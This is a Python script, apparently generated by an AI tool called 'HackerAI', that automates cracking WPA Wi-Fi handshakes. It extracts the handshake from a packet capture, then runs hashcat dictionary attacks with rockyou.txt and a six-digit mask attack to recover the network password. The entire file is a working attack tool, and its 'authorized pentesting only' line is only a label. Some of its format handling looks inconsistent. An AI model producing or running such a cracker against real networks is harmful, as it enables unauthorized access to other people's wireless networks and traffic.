#!/usr/bin/env python3
"""
WPA Handshake Cracker - Automatic handshake capture analysis & cracking
Author: HackerAI - For authorized pentesting only
"""

import os
import sys
import subprocess
import argparse
import re
from pathlib import Path

def check_tools():
    """Verify required tools are installed"""
    tools = ['cap2hccapx', 'hcxpcapngtool', 'hashcat']
    missing = []
    for tool in tools:
        if subprocess.run(['which', tool], capture_output=True).returncode != 0:
            missing.append(tool)
    if missing:
        print(f"❌ Missing tools: {', '.join(missing)}")
        print("Install: sudo apt install hashcat hcxtools")
        sys.exit(1)

def extract_handshake(pcap_file):
    """Extract WPA handshake from pcap/pcapng"""
    print(f"[+] Extracting handshake from {pcap_file}")
    
    # Convert to hccapx format (legacy but widely compatible)
    hccapx_file = pcap_file.with_suffix('.hccapx')
    cmd = ['hcxpcapngtool', '-o', str(hccapx_file), str(pcap_file)]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0 and hccapx_file.exists():
        print(f"✅ Handshake extracted: {hccapx_file}")
        return hccapx_file
    else:
        print("❌ No valid handshake found")
        print(result.stderr)
        return None

def analyze_handshake(hccapx_file):
    """Analyze handshake quality and details"""
    print("\n[+] Analyzing handshake...")
    
    # Extract ESSID and BSSID info
    cmd = ['hashcat', '-m', '22000', str(hccapx_file), '--show', '--quiet']
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    essid = None
    bssid = None
    if result.returncode == 0:
        # Parse hccapx header manually or use hcxtools
        cmd = ['hcxhashtool', '-i', str(hccapx_file), '--info=hash']
        info_result = subprocess.run(cmd, capture_output=True, text=True)
        output = info_result.stdout
        
        # Extract ESSID and BSSID
        essid_match = re.search(r'ESSID:\s*([^\n]+)', output)
        bssid_match = re.search(r'BSSID:\s*([0-9A-F:]{17})', output)
        
        if essid_match:
            essid = essid_match.group(1).strip()
        if bssid_match:
            bssid = bssid_match.group(1)
    
    print(f"   ESSID: {essid or 'Unknown'}")
    print(f"   BSSID: {bssid or 'Unknown'}")
    return essid, bssid

def crack_handshake(hccapx_file, wordlist=None, mask=None):
    """Crack the handshake with wordlist/mask attacks"""
    print("\n[+] Starting crack attack...")
    
    # Default rockyou wordlist
    if not wordlist:
        wordlist = '/usr/share/wordlists/rockyou.txt'
        if not os.path.exists(wordlist):
            print("❌ rockyou.txt not found. Install: gunzip /usr/share/wordlists/rockyou.txt.gz")
            return
    
    # Check if cracked already
    cmd = ['hashcat', '-m', '22000', str(hccapx_file), '--show']
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0 and result.stdout.strip():
        print("✅ Already cracked!")
        print(result.stdout)
        return
    
    # Dictionary attack
    print("[+] Dictionary attack (rockyou)...")
    cmd = [
        'hashcat', '-m', '22000', 
        str(hccapx_file), wordlist,
        '-O',  # Optimized kernel
        '--force',
        '-w', '3'  # High workload
    ]
    
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = proc.communicate()
    
    if proc.returncode == 0:
        print("✅ Password found!")
        subprocess.run(['hashcat', '-m', '22000', str(hccapx_file), '--show'])
        return
    
    # Mask attack if no wordlist success
    if mask:
        print(f"[+] Mask attack: {mask}")
        mask_cmd = [
            'hashcat', '-m', '22000', 
            str(hccapx_file), mask,
            '-a', '3', '-O', '--force', '-w', '3'
        ]
        subprocess.run(mask_cmd)

def main():
    parser = argparse.ArgumentParser(description='Automatic WPA Handshake Cracker')
    parser.add_argument('pcap', help='PCAP/PCAPNG file with handshake')
    parser.add_argument('-w', '--wordlist', help='Custom wordlist')
    parser.add_argument('-m', '--mask', default='?d?d?d?d?d?d', 
                       help='Mask attack (default: 6 digits)')
    parser.add_argument('--attack-only', action='store_true', 
                       help='Skip extraction, use existing hccapx')
    
    args = parser.parse_args()
    
    check_tools()
    pcap_file = Path(args.pcap)
    
    if not pcap_file.exists():
        print(f"❌ File not found: {pcap_file}")
        sys.exit(1)
    
    hccapx_file = None
    if args.attack_only:
        hccapx_file = pcap_file
    else:
        hccapx_file = extract_handshake(pcap_file)
        if not hccapx_file:
            sys.exit(1)
    
    # Analyze
    analyze_handshake(hccapx_file)
    
    # Crack
    crack_handshake(hccapx_file, args.wordlist, args.mask)

if __name__ == "__main__":
    main()
